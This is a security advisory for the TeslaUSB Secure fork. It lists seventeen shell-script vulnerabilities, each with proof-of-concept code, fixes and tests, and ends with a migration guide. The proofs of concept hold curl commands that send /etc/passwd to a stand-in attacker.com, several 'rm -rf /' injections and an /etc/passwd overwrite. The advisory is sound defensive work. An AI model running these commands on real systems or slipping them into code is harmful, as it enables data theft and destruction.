# Security Advisory: TeslaUSB Secure

**Version:** 1.0  
**Date:** 2025-01-XX  
**Severity:** Critical  
**Affected:** Original TeslaUSB (pre-security-hardened fork)

---

## Executive Summary

This document details **17 security vulnerabilities** identified in the original TeslaUSB project and their fixes in TeslaUSB Secure. These vulnerabilities range from **Remote Code Execution (RCE)** to **Local Privilege Escalation** and **Data Corruption**.

**Key Improvements in TeslaUSB Secure:**
- 43 automated security tests
- Zero `eval` usage (command injection prevention)
- Zero `source` usage on user-controlled files (code execution prevention)
- File locking with `flock` (race condition prevention)
- Atomic file operations with verification
- Input validation and sanitization
- Signal handling for graceful shutdown

---

## Vulnerability Index

| ID | Vulnerability | Severity | Category | CWE |
|----|--------------|----------|----------|-----|
| TUSB-001 | Command Injection via eval | **Critical** | RCE | CWE-78 |
| TUSB-002 | Arbitrary Code Execution via source | **Critical** | RCE | CWE-94 |
| TUSB-003 | Race Condition in File Operations | **High** | Integrity | CWE-362 |
| TUSB-004 | Credential File Permission Weakness | **High** | Info Disclosure | CWE-276 |
| TUSB-005 | Log Injection via Control Characters | **Medium** | Integrity | CWE-117 |
| TUSB-006 | URL Injection in Downloads | **Medium** | Integrity | CWE-20 |
| TUSB-007 | Signal Handling Missing | **Medium** | Availability | CWE-390 |
| TUSB-008 | Non-Atomic File Operations | **Medium** | Integrity | CWE-367 |
| TUSB-009 | Input Validation Bypass | **Medium** | Injection | CWE-20 |
| TUSB-010 | Semicolon Command Injection | **High** | RCE | CWE-78 |
| TUSB-011 | Backtick Command Substitution | **High** | RCE | CWE-78 |
| TUSB-012 | Pipe Injection | **High** | RCE | CWE-78 |
| TUSB-013 | Redirection Injection | **Medium** | RCE | CWE-78 |
| TUSB-014 | Double Cleanup Execution | **Low** | Logic | CWE-672 |
| TUSB-015 | Credential Parsing Injection | **High** | RCE | CWE-94 |
| TUSB-016 | DNS Cache Poisoning Risk | **Medium** | Network | CWE-345 |
| TUSB-017 | Unvalidated Archive Paths | **Medium** | Path Traversal | CWE-22 |

---

## Detailed Vulnerability Descriptions

### TUSB-001: Command Injection via eval

**Severity:** Critical  
**CVSS 3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
**CWE:** CWE-78 (OS Command Injection)

#### Description
The original `retry` function used `eval` to execute commands, allowing arbitrary command injection. Any user-controlled input passed to the retry function could execute additional commands.

#### Affected Code (Original)
```bash
retry () {
  local cmd="$1"
  shift
  eval "$cmd"  # DANGEROUS: Command injection possible
}
```

#### Proof of Concept
```bash
# Attacker-controlled input:
retry "echo hello; rm -rf /important_data"
# Executes: echo hello AND rm -rf /important_data

# Or via malicious filename:
FILE="file; cat /etc/passwd"
retry "process_file $FILE"
# Executes additional cat command
```

#### Impact
- **Remote Code Execution** if retry called with network input
- **Data Loss** through command chaining
- **Privilege Escalation** if teslausb runs as root

#### Fix (TeslaUSB Secure)
```bash
retry () {
  local cmd="$1"
  shift
  local attempts=0
  
  while true; do
    if "$cmd" "$@"; then  # SAFE: Direct execution, no eval
      return 0
    fi
    # ... retry logic
  done
}
```

#### Verification
```bash
bash test/test_retry.sh
# Test 5: Security - Command injection attempt should fail safely ✓
```

---

### TUSB-002: Arbitrary Code Execution via source

**Severity:** Critical  
**CVSS 3.1:** 9.1 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)  
**CWE:** CWE-94 (Code Injection)

#### Description
The original code used `source` (`.`) to load credential files, executing any shell code contained within. A compromised or malicious credential file could execute arbitrary commands.

#### Affected Code (Original)
```bash
# DANGEROUS: Executes all commands in credential file
source /root/.teslaCamPushoverCredentials
source /root/.teslaCamArchiveCredentials
```

#### Proof of Concept

Create a malicious credential file:
```bash
cat > /root/.teslaCamPushoverCredentials << 'EOF'
export pushover_user_key=normal_key
$(curl http://attacker.com/steal?data=$(cat /etc/passwd | base64))
rm -rf /
EOF
```

When sourced, this:
1. Sets the expected variable
2. Exfiltrates /etc/passwd to attacker's server
3. Attempts to delete all files

#### Impact
- **Full System Compromise**
- **Data Exfiltration**
- **Credential Theft**
- **Persistent Backdoor** installation

#### Fix (TeslaUSB Secure)
```bash
# SAFE: Parse credentials without execution
user_key=$(grep "^export pushover_user_key=" "$cred_file" 2>/dev/null | \
           sed "s/^export pushover_user_key=//; s/^[\\'\"]//; s/[\\'\"]$//")
```

#### Verification
```bash
bash test/test_credential_parsing.sh
# Test 4: Malicious credential file (safe parsing) ✓
```

---

### TUSB-003: Race Condition in File Operations

**Severity:** High  
**CVSS 3.1:** 7.1 (AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H)  
**CWE:** CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)

#### Description
Multiple concurrent archiveloop processes could access the same files simultaneously without locking, leading to:
- Duplicate file transfers
- Corrupted archives
- Lost recordings

#### Affected Code (Original)
```bash
# No locking - race condition possible
move_to_archive() {
    mv "$source" "$dest"  # Another process might be accessing this
}
```

#### Proof of Concept
```bash
# Simulate concurrent access
for i in {1..5}; do
    archiveloop &  # Start multiple instances
done
wait
# Results in duplicate transfers, corrupted files
```

#### Impact
- **Data Corruption**
- **Storage Waste** from duplicates
- **Lost Recordings** if file deleted during transfer

#### Fix (TeslaUSB Secure)
```bash
move_to_archive() {
    local lock_file="/var/run/teslausb-archive.lock"
    local temp_dest="$dest.tmp.$$"
    
    # Acquire exclusive lock
    exec 200>"$lock_file"
    flock -n 200 || return 1
    
    # Atomic operation
    cp -- "$source" "$temp_dest"
    sync
    mv -- "$temp_dest" "$dest"
    rm -- "$source"
    
    # Lock released automatically on exit
}
```

#### Verification
```bash
bash test/test_file_locking.sh
# Test 1-2: Exclusive lock acquisition and timeout ✓
```

---

### TUSB-004: Credential File Permission Weakness

**Severity:** High  
**CVSS 3.1:** 7.5 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-276 (Incorrect Default Permissions)

#### Description
Credential files were created with default permissions (644), allowing any system user to read sensitive information like passwords and API keys.

#### Affected Code (Original)
```bash
# Creates file with default 644 permissions
echo "export sharepassword=secret123" > /root/.teslaCamArchiveCredentials
```

#### Proof of Concept
```bash
# Any user can read credentials
$ cat /root/.teslaCamArchiveCredentials
export sharepassword=secret123
export pushover_app_key=a987654321
```

#### Impact
- **Credential Disclosure**
- **Unauthorized Archive Access**
- **API Key Theft**

#### Fix (TeslaUSB Secure)
```bash
# Create with restrictive permissions
echo "export sharepassword=secret123" > /root/.teslaCamArchiveCredentials
chmod 600 /root/.teslaCamArchiveCredentials  # Owner read/write only
```

---

### TUSB-005: Log Injection via Control Characters

**Severity:** Medium  
**CVSS 3.1:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)  
**CWE:** CWE-117 (Improper Output Neutralization for Logs)

#### Description
User-controlled input (filenames, error messages) was logged without sanitization, allowing:
- Log file manipulation
- Terminal escape sequence injection
- Log format confusion

#### Affected Code (Original)
```bash
log "Processing file: $filename"
# If filename contains \n or \r, log format is corrupted
```

#### Proof of Concept
```bash
# Malicious filename
filename="正常.log
evil_command_executed"
log "Processing: $filename"

# Log output appears as:
# [2024-01-01] Processing: 正常.log
# evil_command_executed  <-- Looks like separate log entry!
```

#### Impact
- **Log Forgery**
- **Audit Trail Corruption**
- **Misleading Error Messages**

#### Fix (TeslaUSB Secure)
```bash
sanitize_log() {
  local message="$1"
  # Remove control characters and escape sequences
  message=$(printf '%s' "$message" | tr -d '\r\n\000-\031\177' | \
            sed 's/\\e\[[0-9;]*m//g')
  echo "$message"
}

log "Processing: $(sanitize_log "$filename")"
```

#### Verification
```bash
bash test/test_phase3.sh
# Test 2: Log sanitization ✓
```

---

### TUSB-006: URL Injection in Downloads

**Severity:** Medium  
**CVSS 3.1:** 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N)  
**CWE:** CWE-20 (Improper Input Validation)

#### Description
GitHub download URLs were constructed without proper encoding, allowing path traversal and potential SSRF if user-controlled input was used.

#### Affected Code (Original)
```bash
# BRANCH could contain special characters
url="https://github.com/$REPO/raw/$BRANCH/run/$file"
curl -o "$dest" "$url"  # BRANCH=../../evil could traverse paths
```

#### Proof of Concept
```bash
# Path traversal via branch name
BRANCH="../../../malicious/user/master"
# Results in URL: github.com/user/repo/raw/../../../malicious/user/master/run/file
# Effectively: github.com/malicious/user/master/run/file
```

#### Impact
- **Server-Side Request Forgery (SSRF)**
- **Download of Malicious Code**
- **Path Traversal**

#### Fix (TeslaUSB Secure)
```bash
urlencode() {
    local string="$1"
    local strlen=${#string}
    local encoded=""
    
    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9]) encoded+="$c" ;;
            *) printf -v o '%%%02x' "'$c"; encoded+="$o" ;;
        esac
    done
    echo "$encoded"
}

url="https://github.com/$(urlencode "$REPO")/raw/$(urlencode "$BRANCH")/run/$file"
```

#### Verification
```bash
bash test/test_phase3.sh
# Test 1: URL encoding ✓
```

---

### TUSB-007: Signal Handling Missing

**Severity:** Medium  
**CVSS 3.1:** 5.3 (AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L)  
**CWE:** CWE-390 (Detection of Error Condition Without Action)

#### Description
The archiveloop daemon did not handle signals (SIGINT, SIGTERM), causing:
- Corrupted files during interrupted transfers
- Orphaned lock files
- Incomplete archive operations

#### Affected Code (Original)
```bash
archiveloop() {
    while true; do
        move_files_to_archive  # Interrupted = corrupted file
    done
}
# No trap handlers defined
```

#### Impact
- **Data Corruption**
- **Stale Lock Files**
- **Resource Leaks**

#### Fix (TeslaUSB Secure)
```bash
archiveloop() {
    local cleanup_done=false
    
    cleanup() {
        [ "$cleanup_done" = true ] && return
        cleanup_done=true
        log "Shutting down gracefully..."
        rm -f "$LOCK_FILE"
        exit 0
    }
    
    trap cleanup EXIT INT TERM HUP
    
    while true; do
        move_files_to_archive
    done
}
```

#### Verification
```bash
bash test/test_phase3.sh
# Test 3: Signal handlers ✓
# Test 6: Cleanup state (prevents double cleanup) ✓
```

---

### TUSB-008: Non-Atomic File Operations

**Severity:** Medium  
**CVSS 3.1:** 5.9 (AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N)  
**CWE:** CWE-367 (Time-of-check Time-of-use Race Condition)

#### Description
Files were moved directly without atomic operations, allowing corruption if:
- Power loss during transfer
- Process killed mid-operation
- Concurrent access

#### Proof of Concept
```bash
# Non-atomic: File is incomplete if interrupted
mv large_file.mp4 /archive/
# If interrupted: partial file exists in archive
```

#### Impact
- **Corrupted Archives**
- **Lost Data**
- **Inconsistent State**

#### Fix (TeslaUSB Secure)
```bash
atomic_move() {
    local source="$1"
    local dest="$2"
    local tmp="$dest.tmp.$$"
    
    # Copy to temp location
    cp -- "$source" "$tmp"
    
    # Ensure data is written to disk
    sync
    
    # Verify size
    local orig_size=$(stat -c%s "$source")
    local copy_size=$(stat -c%s "$tmp")
    [ "$orig_size" -ne "$copy_size" ] && return 1
    
    # Atomic rename
    mv -- "$tmp" "$dest"
    rm -- "$source"
}
```

#### Verification
```bash
bash test/test_file_locking.sh
# Test 3: Atomic move operation ✓
# Test 4: Size verification ✓
```

---

### TUSB-009: Input Validation Bypass

**Severity:** Medium  
**CVSS 3.1:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L)  
**CWE:** CWE-20 (Improper Input Validation)

#### Description
Configuration variables (campercent, REPO, BRANCH) were not validated, allowing:
- Invalid campercent values (e.g., 999)
- Path traversal via REPO/BRANCH
- Buffer overflow risks

#### Proof of Concept
```bash
campercent=999  # More than 100%!
REPO="../../../etc"
BRANCH="shadow"
```

#### Fix (TeslaUSB Secure)
```bash
validate_campercent() {
    local val="$1"
    if ! [[ "$val" =~ ^[0-9]+$ ]] || [ "$val" -lt 0 ] || [ "$val" -gt 100 ]; then
        log "ERROR: campercent must be 0-100"
        return 1
    fi
}

validate_repo_branch() {
    local val="$1"
    if [[ "$val" =~ [\$\;\|\&\<\>\`\(\)\{\}] ]]; then
        log "ERROR: Invalid characters in REPO/BRANCH"
        return 1
    fi
}
```

---

### TUSB-010: Semicolon Command Injection

**Severity:** High  
**CVSS 3.1:** 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)  
**CWE:** CWE-78 (OS Command Injection)

#### Description
Semicolons in input could be interpreted as command separators when improperly handled.

#### Proof of Concept
```bash
user_input="file.mp4; rm -rf /"
eval "process_file $user_input"
# Executes: process_file file.mp4
#           rm -rf /
```

#### Fix (TeslaUSB Secure)
```bash
# Injection character detection
if [[ "$input" =~ [\$\;\|\&\<\>\`\(\)\{\}] ]]; then
    log "ERROR: Injection attempt detected"
    return 1
fi
```

---

### TUSB-011: Backtick Command Substitution

**Severity:** High  
**CVSS 3.1:** 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)  
**CWE:** CWE-78 (OS Command Injection)

#### Description
Backticks in input could execute arbitrary commands through command substitution.

#### Proof of Concept
```bash
# Malicious credential
pushover_user_key="user\`whoami\`"
# When processed: executes whoami command
```

#### Fix (TeslaUSB Secure)
- Detect and reject backtick characters
- Use safe parsing instead of shell evaluation

---

### TUSB-012: Pipe Injection

**Severity:** High  
**CVSS 3.1:** 7.7 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H)  
**CWE:** CWE-78 (OS Command Injection)

#### Description
Pipe characters in input could chain commands to exfiltrate data.

#### Proof of Concept
```bash
input="normal | curl -d @/etc/passwd attacker.com"
eval "cmd $input"
# Exfiltrates /etc/passwd to attacker
```

---

### TUSB-013: Redirection Injection

**Severity:** Medium  
**CVSS 3.1:** 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N)  
**CWE:** CWE-78 (OS Command Injection)

#### Description
Angle brackets could redirect output to overwrite system files.

#### Proof of Concept
```bash
input="file > /etc/passwd"
eval "cmd $input"
# Overwrites /etc/passwd with output
```

---

### TUSB-014: Double Cleanup Execution

**Severity:** Low  
**CVSS 3.1:** 3.3 (AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L)  
**CWE:** CWE-672 (Operation on Resource After Expiration or Release)

#### Description
Cleanup functions could be called multiple times, causing errors or race conditions.

#### Fix (TeslaUSB Secure)
```bash
cleanup() {
    [ "$CLEANUP_DONE" = true ] && return
    CLEANUP_DONE=true
    # ... cleanup code
}
```

---

### TUSB-015: Credential Parsing Injection

**Severity:** High  
**CVSS 3.1:** 8.8 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)  
**CWE:** CWE-94 (Code Injection)

#### Description
Combines multiple injection vectors in credential parsing. See TUSB-002.

---

### TUSB-016: DNS Cache Poisoning Risk

**Severity:** Medium  
**CVSS 3.1:** 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N)  
**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)

#### Description
Hardcoded DNS servers could not be changed, limiting ability to use secure DNS.

#### Fix (TeslaUSB Secure)
```bash
# Configurable DNS
export ARCHIVE_DNS_SERVER="1.1.1.1"  # Cloudflare
# or
export ARCHIVE_DNS_SERVER="9.9.9.9"  # Quad9
```

---

### TUSB-017: Unvalidated Archive Paths

**Severity:** Medium  
**CVSS 3.1:** 5.3 (AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)  
**CWE:** CWE-22 (Improper Limitation of a Pathname)

#### Description
Archive paths were not validated, potentially allowing writes outside intended directories.

---

## Migration Guide: Original → TeslaUSB Secure

### Pre-Migration Checklist

1. **Backup Current Installation**
   ```bash
   tar czf /root/teslausb-backup-$(date +%Y%m%d).tar.gz /root/bin/
   ```

2. **Document Current Configuration**
   ```bash
   cat /root/.teslaCamArchiveCredentials
   cat /root/.teslaCamPushoverCredentials
   # Note all values for migration
   ```

### Migration Steps

#### Step 1: Stop Services
```bash
systemctl stop teslausb-archiveloop
pkill -f archiveloop
```

#### Step 2: Backup Credentials
```bash
mkdir -p /root/teslausb-backup
cp /root/.teslaCam*Credentials /root/teslausb-backup/
```

#### Step 3: Install TeslaUSB Secure
```bash
# Option A: One-line installer
curl -fsSL https://raw.githubusercontent.com/Zyrial96/teslausb-secure/main/setup/pi/configure.sh | sudo bash

# Option B: Manual installation
git clone https://github.com/Zyrial96/teslausb-secure.git
cd teslausb-secure
cp run/* /root/bin/
chmod 600 /root/.teslaCam*Credentials
```

#### Step 4: Validate Installation
```bash
# Run all security tests
bash test/test_retry.sh
bash test/test_credential_parsing.sh
bash test/test_file_locking.sh
bash test/test_phase3.sh

# Expected: 43/43 tests passed
```

#### Step 5: Secure Credentials
```bash
# Fix permissions
chmod 600 /root/.teslaCamArchiveCredentials
chmod 600 /root/.teslaCamPushoverCredentials
ls -la /root/.teslaCam*Credentials
# Should show: -rw------- (600)
```

#### Step 6: Configure DNS (Optional)
```bash
# Add to /root/.teslaCamArchiveCredentials or export before setup
export ARCHIVE_DNS_SERVER="1.1.1.1"
```

#### Step 7: Restart Services
```bash
reboot
```

### Post-Migration Verification

```bash
# Check archiveloop is running
pgrep -f archiveloop

# Verify file permissions
ls -la /root/.teslaCam*

# Test archive functionality
touch /mnt/cam/TeslaCam/test_file.txt
# Wait for next archive cycle, verify file appears on NAS

# Check logs for security events
tail -f /var/log/teslausb.log | grep -i "injection\|security\|error"
```

### Rollback Procedure

If issues occur:

```bash
# Stop services
systemctl stop teslausb-archiveloop

# Restore from backup
cd /root
tar xzf teslausb-backup-YYYYMMDD.tar.gz

# Restore credentials
cp /root/teslausb-backup/.teslaCam*Credentials /root/

# Reboot
reboot
```

---

## Security Best Practices

### Credential Management
1. Store credentials in files with mode 600
2. Never commit credentials to git
3. Rotate API keys regularly
4. Use environment-specific credentials

### Network Security
1. Use dedicated VLAN for TeslaUSB
2. Enable SMB signing on NAS
3. Use SSH keys for rsync (not passwords)
4. Configure firewall rules

### Monitoring
```bash
# Check for injection attempts
grep -i "injection\|malicious\|suspicious" /var/log/teslausb.log

# Monitor failed archive attempts
grep "archive failed" /var/log/teslausb.log | tail -20

# Check disk space
df -h /mnt/cam
```

---

## Test Results

```
Phase 1.1 (eval removal):        7/7  ✓
Phase 1.2 (source removal):      11/11 ✓
Phase 2 (file locking):          9/9  ✓
Phase 3 (robustness):            16/16 ✓
────────────────────────────────────────
TOTAL:                           43/43 ✓
```

---

## References

- Original TeslaUSB: https://github.com/marcone/teslausb
- TeslaUSB Secure: https://github.com/Zyrial96/teslausb-secure
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- CWE-94: https://cwe.mitre.org/data/definitions/94.html
- CWE-362: https://cwe.mitre.org/data/definitions/362.html

---

## Changelog

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | 2025-01 | Initial security advisory |

---

**Report Security Issues:**  
Please report security vulnerabilities to the TeslaUSB Secure repository issues page.
